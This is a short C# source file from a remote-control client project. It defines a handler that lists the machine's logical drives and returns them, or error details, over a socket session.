using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using RemoteControl.Protocals;
using Microsoft.Win32;
using RemoteControl.Protocals.Response;
using RemoteControl.Protocals.Request;
using System.Windows.Forms;
using RemoteControl.Protocals.Utilities;

namespace RemoteControl.Client.Handlers
{
    class RequestGetDrivesHandler : IRequestHandler
    {
        public void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            var resp = new ResponseGetDrives();
            try
            {
                resp.drives = Environment.GetLogicalDrives().ToList();
            }
            catch (Exception ex)
            {
                resp.Result = false;
                resp.Message = ex.ToString();
                resp.Detail = ex.StackTrace.ToString();
            }

            session.Send(ePacketType.PACKET_GET_DRIVES_RESPONSE, resp);
        }
    }
}
